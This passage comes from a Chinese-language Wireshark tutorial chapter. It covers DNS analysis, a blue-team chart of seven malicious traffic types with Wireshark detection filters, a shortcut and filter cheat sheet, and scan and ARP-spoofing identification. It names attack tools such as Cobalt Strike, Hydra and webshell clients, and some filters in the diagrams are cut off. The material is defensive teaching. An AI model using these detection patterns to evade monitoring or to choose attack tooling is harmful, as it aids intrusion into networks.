  <text x="540" y="556" text-anchor="middle" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">经典工具验证: iodine/dnscat2/dns2tcp=3 个常见 DNS 隧道工具 → 先自己用 Kali 搭一遍=再抓包看=立刻就懂特征长啥样</text>
</svg>
```


### 场景说明

分析DNS查询过程，了解域名解析。

### DNS查询分析

**过滤器：** `dns`

你会看到：
```
Query: www.example.com A
Response: www.example.com A 93.184.216.34
```

### DNS解析过程

DNS使用UDP协议（有时也用TCP）：
1. 客户端发送查询请求
2. DNS服务器返回解析结果

---

## 5.16 实战案例：恶意流量识别

```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 560" width="1080" height="560" style="max-width:100%;background:linear-gradient(180deg,#020617 0%,#0f172a 100%);border-radius:14px;border:1px solid #1e293b">
  <defs>
    <linearGradient id="g1s21" x1="0" x2="1" y1="0" y2="0"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="g2s21" x1="0" x2="0" y1="0" y2="1"><stop offset="0" stop-color="#1e293b"/><stop offset="1" stop-color="#020617"/></linearGradient>
    <marker id="arrs21" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M 0 0 L 10 5 L 0 10 z" fill="#60a5fa"/></marker>
    <filter id="shs21"><feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#000" flood-opacity="0.55"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="64" fill="url(#g1s21)" opacity="0.3"/>
  <rect x="0" y="0" width="1080" height="2" fill="url(#g1s21)"/>
  <rect x="0" y="60" width="1080" height="2" fill="#1e293b"/>  <text x="540" y="36" text-anchor="middle" font-size="20" font-weight="800" fill="#f1f5f9" font-family="Microsoft YaHei,Arial" filter="url(#shs21)">图 5-21 实战 5：恶意流量识别 7 大类攻击（扫描/爆破/横向/Webshell/C2/加密矿/勒索）</text>  <text x="540" y="56" text-anchor="middle" font-size="12" fill="#94a3b8" font-family="Microsoft YaHei,Arial">Hvv 蓝队分析 3 步法= ① Endpoints 找异常 IP Bytes Top → ② Conversations 找 C2 对聊 → ③ Follow Stream 看具体内容=30s 定结论</text>  <rect x="30" y="100" width="250" height="210" rx="12" fill="#0b1530" stroke="#ef4444"/>  <rect x="30" y="100" width="250" height="36" rx="12" fill="#ef4444" opacity="0.2"/>  <text x="155" y="116" text-anchor="middle" font-size="10.5" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">① 端口扫描</text>  <text x="155" y="132" text-anchor="middle" font-size="9.5" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">Nmap/Masscan</text>  <text x="40" y="144" font-size="8.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">特征: 单源 IP → 目标 1~65535 端口 SYN/ACK</text>  <text x="40" y="161" font-size="8.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">一秒&gt;1000 SYN=半开扫描=典型 Nmap -sS</text>  <text x="40" y="178" font-size="8.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">过滤器: tcp.flags.syn==1 &amp;&amp; tcp.flags.a</text>  <text x="40" y="195" font-size="8.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">应对: 防火墙 rate limit=每秒 5 次 + Fail2ban</text>  <rect x="290" y="100" width="250" height="210" rx="12" fill="#0b1530" stroke="#ec4899"/>  <rect x="290" y="100" width="250" height="36" rx="12" fill="#ec4899" opacity="0.2"/>  <text x="415" y="116" text-anchor="middle" font-size="10.5" font-weight="800" fill="#ec4899" font-family="Microsoft YaHei,Arial">② 口令爆破</text>  <text x="415" y="132" text-anchor="middle" font-size="9.5" font-weight="800" fill="#ec4899" font-family="Microsoft YaHei,Arial">Hydra/Medusa/Burp Intruder</text>  <text x="300" y="144" font-size="8.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">特征: 短时间 SSH/RDP/MySQL 重复握手</text>  <text x="300" y="161" font-size="8.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">相同源 IP→目标端口 失败响应&gt;100 次/分钟</text>  <text x="300" y="178" font-size="8.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">过滤器: ssh.protocol || rdpcookie || my</text>  <text x="300" y="195" font-size="8.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">应对: 账号锁定 5 次失败锁 30min + MFA</text>  <rect x="550" y="100" width="250" height="210" rx="12" fill="#0b1530" stroke="#f59e0b"/>  <rect x="550" y="100" width="250" height="36" rx="12" fill="#f59e0b" opacity="0.2"/>  <text x="675" y="116" text-anchor="middle" font-size="10.5" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">③ 内网横向</text>  <text x="675" y="132" text-anchor="middle" font-size="9.5" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">SMB/PsExec/WMI DCOM</text>  <text x="560" y="144" font-size="8.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">特征: 大量 tcp/445 / tcp/135 / tcp/3389</text>  <text x="560" y="161" font-size="8.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">源是业务机 → 目标是其他内网服务器 10.x/172.x/192.16</text>  <text x="560" y="178" font-size="8.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">过滤器: smb2 || dcerpc || tcp.port == 3</text>  <text x="560" y="195" font-size="8.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">应对: 微分段 VLAN ACL + 445 默认禁止 PC 间互访</text>  <rect x="810" y="100" width="250" height="210" rx="12" fill="#0b1530" stroke="#8b5cf6"/>  <rect x="810" y="100" width="250" height="36" rx="12" fill="#8b5cf6" opacity="0.2"/>  <text x="935" y="116" text-anchor="middle" font-size="10.5" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">④ Webshell 通信</text>  <text x="935" y="132" text-anchor="middle" font-size="9.5" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">一句话菜刀/蚁剑/冰蝎/哥斯拉</text>  <text x="820" y="144" font-size="8.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">特征: HTTP POST → .php/.jsp/.aspx 异常路径</text>  <text x="820" y="161" font-size="8.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">请求体/响应体 极长=base64/AES 加密流量+畸形 User-A</text>  <text x="820" y="178" font-size="8.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">过滤器: http.request.method == POST &amp;&amp; </text>  <text x="820" y="195" font-size="8.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">应对: WAF 正则拦截+RASP 拦截危险函数 eval/system</text>  <rect x="30" y="320" width="250" height="210" rx="12" fill="#0b1530" stroke="#a855f7"/>  <rect x="30" y="320" width="250" height="36" rx="12" fill="#a855f7" opacity="0.2"/>  <text x="155" y="336" text-anchor="middle" font-size="10.5" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">⑤ C2 远控通信</text>  <text x="155" y="352" text-anchor="middle" font-size="9.5" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">CobaltStrike/Metasploit/NSA</text>  <text x="40" y="364" font-size="8.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">特征: 心跳 60s 一次 固定间隔 + TLS 证书自签/无 CN</text>  <text x="40" y="381" font-size="8.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">JA3/JA3S 哈希匹配公开 Cobalt Strike profil</text>  <text x="40" y="398" font-size="8.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">过滤器: tcp.len == 0 定时心跳 + http.user_a</text>  <text x="40" y="415" font-size="8.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">应对: 威胁情报 JA3 + EDR 进程树=双杀 C2</text>  <rect x="290" y="320" width="250" height="210" rx="12" fill="#0b1530" stroke="#0ea5e9"/>  <rect x="290" y="320" width="250" height="36" rx="12" fill="#0ea5e9" opacity="0.2"/>  <text x="415" y="336" text-anchor="middle" font-size="10.5" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">⑥ 加密货币挖矿</text>  <text x="415" y="352" text-anchor="middle" font-size="9.5" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">XMRig/Stratum</text>  <text x="300" y="364" font-size="8.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">特征: 长时间 TCP 连接 固定地址 高频小包</text>  <text x="300" y="381" font-size="8.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">Stratum 协议 tcp/3333/8899 常见挖矿池端口 + C</text>  <text x="300" y="398" font-size="8.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">过滤器: tcp.port in {3333 8899 8888 555</text>  <text x="300" y="415" font-size="8.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">应对: DNS 屏蔽已知矿池域名 + IP 信誉库 deny</text>  <rect x="550" y="320" width="250" height="210" rx="12" fill="#0b1530" stroke="#dc2626"/>  <rect x="550" y="320" width="250" height="36" rx="12" fill="#dc2626" opacity="0.2"/>  <text x="675" y="336" text-anchor="middle" font-size="10.5" font-weight="800" fill="#dc2626" font-family="Microsoft YaHei,Arial">⑦ 勒索软件横向</text>  <text x="675" y="352" text-anchor="middle" font-size="9.5" font-weight="800" fill="#dc2626" font-family="Microsoft YaHei,Arial">LockBit/Conti/Cl0p</text>  <text x="560" y="364" font-size="8.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">特征: 短时间大量 SMB/NTFS 写操作=加密文件前先窃取</text>  <text x="560" y="381" font-size="8.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">MFT USN 日志=数百万 rename/create 操作 + vs</text>  <text x="560" y="398" font-size="8.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">过滤器: smb2.cmd == 9 (Write) + 大量连续包 +</text>  <text x="560" y="415" font-size="8.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">应对: 备份=3-2-1 离线 + EDR 杀勒索特征 + 恢复演练</text>
</svg>
```
```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 570" width="1080" height="570" style="max-width:100%;background:linear-gradient(180deg,#020617 0%,#0f172a 100%);border-radius:14px;border:1px solid #1e293b">
  <defs>
    <linearGradient id="g1s22" x1="0" x2="1" y1="0" y2="0"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="g2s22" x1="0" x2="0" y1="0" y2="1"><stop offset="0" stop-color="#1e293b"/><stop offset="1" stop-color="#020617"/></linearGradient>
    <marker id="arrs22" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M 0 0 L 10 5 L 0 10 z" fill="#60a5fa"/></marker>
    <filter id="shs22"><feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#000" flood-opacity="0.55"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="64" fill="url(#g1s22)" opacity="0.3"/>
  <rect x="0" y="0" width="1080" height="2" fill="url(#g1s22)"/>
  <rect x="0" y="60" width="1080" height="2" fill="#1e293b"/>  <text x="540" y="36" text-anchor="middle" font-size="20" font-weight="800" fill="#f1f5f9" font-family="Microsoft YaHei,Arial" filter="url(#shs22)">图 5-22 Wireshark 终极速查海报：30 快捷键 + 颜色规则 + 20 条过滤语句 + 学习路线 4 卡合一</text>  <text x="540" y="56" text-anchor="middle" font-size="12" fill="#94a3b8" font-family="Microsoft YaHei,Arial">贴在桌面上=一个月熟练 → 实战 CTF/Hvv 闭眼快捷键=效率飞起来</text>  <rect x="30" y="100" width="500" height="250" rx="12" fill="#0b1530" stroke="#0ea5e9"/>  <text x="280" y="120" text-anchor="middle" font-size="12.5" font-weight="800" fill="#93c5fd" font-family="Microsoft YaHei,Arial">① 30 个高频快捷键（90% 只用这 20 个）</text>  <text x="42" y="142" font-size="9" font-weight="800" fill="#fde68a" font-family="Consolas,Arial">Ctrl + E</text>  <text x="162" y="142" font-size="8.8" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">开始/停止抓包</text>  <text x="300" y="142" font-size="9" font-weight="800" fill="#fde68a" font-family="Consolas,Arial">Ctrl + K</text>  <text x="420" y="142" font-size="8.8" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">抓包选项界面</text>  <text x="42" y="162" font-size="9" font-weight="800" fill="#fde68a" font-family="Consolas,Arial">Ctrl + F</text>  <text x="162" y="162" font-size="8.8" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">包内搜索（字符串/hex/正则）</text>  <text x="300" y="162" font-size="9" font-weight="800" fill="#fde68a" font-family="Consolas,Arial">Ctrl + L</text>  <text x="420" y="162" font-size="8.8" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">显示过滤器 清空</text>  <text x="42" y="182" font-size="9" font-weight="800" fill="#fde68a" font-family="Consolas,Arial">Ctrl + N / P</text>  <text x="162" y="182" font-size="8.8" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">下一个/上一个包</text>  <text x="300" y="182" font-size="9" font-weight="800" fill="#fde68a" font-family="Consolas,Arial">Ctrl + G</text>  <text x="420" y="182" font-size="8.8" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">跳到 No. 编号包</text>  <text x="42" y="202" font-size="9" font-weight="800" fill="#fde68a" font-family="Consolas,Arial">Ctrl + /</text>  <text x="162" y="202" font-size="8.8" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">跳到显示过滤器输入框</text>  <text x="300" y="202" font-size="9" font-weight="800" fill="#fde68a" font-family="Consolas,Arial">Ctrl + →/←</text>  <text x="420" y="202" font-size="8.8" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">下一个/上一个匹配</text>  <text x="42" y="222" font-size="9" font-weight="800" fill="#fde68a" font-family="Consolas,Arial">Ctrl + Shift + P</text>  <text x="162" y="222" font-size="8.8" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">当前包十六进制导出</text>  <text x="300" y="222" font-size="9" font-weight="800" fill="#fde68a" font-family="Consolas,Arial">Ctrl + I</text>  <text x="420" y="222" font-size="8.8" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">合并 pcap (Merge)</text>  <text x="42" y="242" font-size="9" font-weight="800" fill="#fde68a" font-family="Consolas,Arial">Ctrl + Alt + 1~3</text>  <text x="162" y="242" font-size="8.8" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">切换面板位置 1=列表 2=树 3=Hex</text>  <text x="300" y="242" font-size="9" font-weight="800" fill="#fde68a" font-family="Consolas,Arial">Alt + ←/→</text>  <text x="420" y="242" font-size="8.8" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">回退/前进浏览历史包</text>  <text x="42" y="262" font-size="9" font-weight="800" fill="#fde68a" font-family="Consolas,Arial">空格键 / 回车</text>  <text x="162" y="262" font-size="8.8" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">展开/折叠中间协议树面板</text>  <text x="300" y="262" font-size="9" font-weight="800" fill="#fde68a" font-family="Consolas,Arial">M 键</text>  <text x="420" y="262" font-size="8.8" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">标记当前包 Mark</text>  <text x="42" y="282" font-size="9" font-weight="800" fill="#fde68a" font-family="Consolas,Arial">Ctrl + D</text>  <text x="162" y="282" font-size="8.8" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">Decode As 手动重新解码协议</text>  <text x="300" y="282" font-size="9" font-weight="800" fill="#fde68a" font-family="Consolas,Arial">Shift + F11</text>  <text x="420" y="282" font-size="8.8" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">颜色规则 Color Rules 打开</text>  <text x="42" y="302" font-size="9" font-weight="800" fill="#fde68a" font-family="Consolas,Arial">右键 F</text>  <text x="162" y="302" font-size="8.8" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">Follow TCP Stream（鼠标党最常用）</text>  <text x="300" y="302" font-size="9" font-weight="800" fill="#fde68a" font-family="Consolas,Arial">右键 C</text>  <text x="420" y="302" font-size="8.8" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">作为过滤器 Apply as Filter</text>  <rect x="550" y="100" width="500" height="250" rx="12" fill="#0b1530" stroke="#10b981"/>  <text x="800" y="120" text-anchor="middle" font-size="12.5" font-weight="800" fill="#34d399" font-family="Microsoft YaHei,Arial">② 颜色规则（View → Coloring Rules 12 条一眼看懂）</text>  <circle cx="562" cy="140" r="7" fill="#f59e0b"/>  <text x="578" y="144" font-size="9.2" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">UDP 协议（浅金 背景）</text>  <text x="578" y="157" font-size="8.4" fill="#cbd5e1" font-family="Consolas,Arial">udp</text>  <circle cx="820" cy="140" r="7" fill="#0ea5e9"/>  <text x="836" y="144" font-size="9.2" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">NCP TCP</text>  <text x="836" y="157" font-size="8.4" fill="#cbd5e1" font-family="Consolas,Arial">tcp.port == 524</text>  <circle cx="562" cy="176" r="7" fill="#ec4899"/>  <text x="578" y="180" font-size="9.2" font-weight="800" fill="#ec4899" font-family="Microsoft YaHei,Arial">TCP SYN/FIN/连接握手（品</text>  <text x="578" y="193" font-size="8.4" fill="#cbd5e1" font-family="Consolas,Arial">tcp.flags.syn || tcp.flags.fin</text>  <circle cx="820" cy="176" r="7" fill="#10b981"/>  <text x="836" y="180" font-size="9.2" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">ICMP（绿 背景）</text>  <text x="836" y="193" font-size="8.4" fill="#cbd5e1" font-family="Consolas,Arial">icmp || icmpv6</text>  <circle cx="562" cy="212" r="7" fill="#ef4444"/>  <text x="578" y="216" font-size="9.2" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">HTTP 错误 4xx/5xx  红</text>  <text x="578" y="229" font-size="8.4" fill="#cbd5e1" font-family="Consolas,Arial">http.response.code &gt;= 400</text>  <circle cx="820" cy="212" r="7" fill="#a855f7"/>  <text x="836" y="216" font-size="9.2" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">ARP（紫色）</text>  <text x="836" y="229" font-size="8.4" fill="#cbd5e1" font-family="Consolas,Arial">arp</text>  <circle cx="562" cy="248" r="7" fill="#fde68a"/>  <text x="578" y="252" font-size="9.2" font-weight="800" fill="#fde68a" font-family="Microsoft YaHei,Arial">HTTP 正常 2xx  黄背景</text>  <text x="578" y="265" font-size="8.4" fill="#cbd5e1" font-family="Consolas,Arial">http.response.code &lt; 400</text>  <circle cx="820" cy="248" r="7" fill="#8b5cf6"/>  <text x="836" y="252" font-size="9.2" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">TLS/SSL 握手</text>  <text x="836" y="265" font-size="8.4" fill="#cbd5e1" font-family="Consolas,Arial">tls.handshake.type == 1 || 2</text>  <circle cx="562" cy="284" r="7" fill="#93c5fd"/>  <text x="578" y="288" font-size="9.2" font-weight="800" fill="#93c5fd" font-family="Microsoft YaHei,Arial">DNS 查询/响应</text>  <text x="578" y="301" font-size="8.4" fill="#cbd5e1" font-family="Consolas,Arial">dns</text>  <circle cx="820" cy="284" r="7" fill="#cbd5e1"/>  <text x="836" y="288" font-size="9.2" font-weight="800" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">TCP 重传(灰底红字)</text>  <text x="836" y="301" font-size="8.4" fill="#cbd5e1" font-family="Consolas,Arial">tcp.analysis.retransmission</text>  <rect x="30" y="360" width="500" height="170" rx="12" fill="#0b1530" stroke="#8b5cf6"/>  <text x="280" y="380" text-anchor="middle" font-size="12.5" font-weight="800" fill="#c4b5fd" font-family="Microsoft YaHei,Arial">③ 20 条显示过滤器 打印版（一查就有）</text>  <text x="42" y="392" font-size="9.2" fill="#e2e8f0" font-family="Consolas,Arial">1 ip.addr == 192.168.1.1        11 tcp.flags.reset == 1  RST 断开</text>  <text x="42" y="407" font-size="9.2" fill="#e2e8f0" font-family="Consolas,Arial">2 tcp.port == 443                12 http.request.method == POST</text>  <text x="42" y="422" font-size="9.2" fill="#e2e8f0" font-family="Consolas,Arial">3 udp.port == 53  DNS             13 dns.qry.name contains 'baidu'</text>  <text x="42" y="437" font-size="9.2" fill="#e2e8f0" font-family="Consolas,Arial">4 tls  HTTPS/TLS                 14 tls.handshake.type == 1 Client Hello</text>  <text x="42" y="452" font-size="9.2" fill="#e2e8f0" font-family="Consolas,Arial">5 http.host == 'api.xx.com'      15 tcp.stream eq 3 第 3 条流</text>  <text x="42" y="467" font-size="9.2" fill="#e2e8f0" font-family="Consolas,Arial">6 frame contains 'password'      16 frame.len &gt; 1400 大包</text>  <text x="42" y="482" font-size="9.2" fill="#e2e8f0" font-family="Consolas,Arial">7 arp  ARP 包                    17 tcp.analysis.retransmission</text>  <text x="42" y="497" font-size="9.2" fill="#e2e8f0" font-family="Consolas,Arial">8 tcp.flags.syn==1 握手          18 tcp.connection.rtt &gt; 0.3 慢</text>  <text x="42" y="512" font-size="9.2" fill="#e2e8f0" font-family="Consolas,Arial">9 icmp.type == 8  Ping 请求      19 smb2.filename contains 'secret'</text>  <text x="42" y="527" font-size="9.2" fill="#e2e8f0" font-family="Consolas,Arial">10 dns.flags.rcode == 3  NX      20 ssh.protocol == 'SSH-2.0-OpenSSH*'</text>  <rect x="550" y="360" width="500" height="170" rx="12" fill="#0b1530" stroke="#ec4899"/>  <text x="800" y="380" text-anchor="middle" font-size="12.5" font-weight="800" fill="#f9a8d4" font-family="Microsoft YaHei,Arial">④ Wireshark 学习路径 4 阶段（按顺序学=避免走弯路）</text>  <text x="562" y="402" font-size="9.5" font-weight="800" fill="#ec4899" font-family="Microsoft YaHei,Arial">阶段1 入门</text>  <text x="640" y="402" font-size="8.8" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">① 认识界面 8 区域 + 颜色规则</text>  <text x="640" y="417" font-size="8.8" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">② 写 10 条 BPF + 10 条显示过滤器</text>  <text x="640" y="432" font-size="8.8" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">③ 50 遍 Follow TCP Stream 练手</text>  <text x="562" y="444" font-size="9.5" font-weight="800" fill="#ec4899" font-family="Microsoft YaHei,Arial">阶段2 协议</text>  <text x="640" y="444" font-size="8.8" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">① TCP 握手/挥手 背下来</text>  <text x="640" y="459" font-size="8.8" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">② DNS + HTTP + TLS 报文结构逐字节</text>  <text x="640" y="474" font-size="8.8" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">③ TLS 1.2/1.3 握手图默写</text>  <text x="562" y="486" font-size="9.5" font-weight="800" fill="#ec4899" font-family="Microsoft YaHei,Arial">阶段3 进阶</text>  <text x="640" y="486" font-size="8.8" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">① Statistics 6 大统计全部点开 3 次</text>  <text x="640" y="501" font-size="8.8" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">② Expert Info 告警 4 类识别</text>  <text x="640" y="516" font-size="8.8" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">③ I/O Graph 画图=定位峰值</text>  <text x="562" y="528" font-size="9.5" font-weight="800" fill="#ec4899" font-family="Microsoft YaHei,Arial">阶段4 实战</text>  <text x="640" y="528" font-size="8.8" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">① 自己搭靶机 DVWA 抓 login</text>  <text x="640" y="543" font-size="8.8" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">② HTTPS 解密 mitmproxy 做一遍</text>  <text x="640" y="558" font-size="8.8" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">③ pcap 恶意流量公开数据集 100+ 打标签</text>  <rect x="30" y="540" width="1020" height="24" rx="8" fill="#020617" stroke="#1e293b"/>
  <text x="540" y="556" text-anchor="middle" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">终极目标=3 秒内: 看 Conversations 找 Top 1 IP → tcp.stream eq 该流 → Follow Stream → 判断业务类型+是否恶意=出师</text>
</svg>
```



### 场景说明

发现异常流量，识别可能的攻击。

### 扫描流量识别

**端口扫描特征：**
- 大量SYN包
- 多个不同目标端口
- 快速连续发送

**过滤器：**
```
tcp.flags.syn == 1 and tcp.flags.ack == 0
```

### ARP欺骗识别

**ARP欺骗特征：**
- 大量ARP响应
- MAC地址频繁变化

**过滤器：**
```
arp
```

### 异常流量统计

使用IO Graph查看流量异常：
- 流量突然激增
- 异常时间段的流量

---

## 总结

本章详细介绍了Wireshark的使用：

1. **安装配置**：Windows/Linux/macOS安装
2. **界面布局**：主界面各区域详解
3. **基本操作**：捕获、保存、打开文件
4. **捕获过滤**：设置捕获条件
5. **显示过滤**：筛选显示数据包
6. **协议分析**：流追踪、会话追踪
7. **统计分析**：协议层级、会话、IO图表
8. **tshark命令**：命令行使用
9. **实战案例**：HTTP、HTTPS、TCP、DNS分析

Wireshark是网络分析的必备工具，掌握它能够帮助你更好地理解网络通信。

下一章我们将学习Ncat/Netcat——网络瑞士军刀！

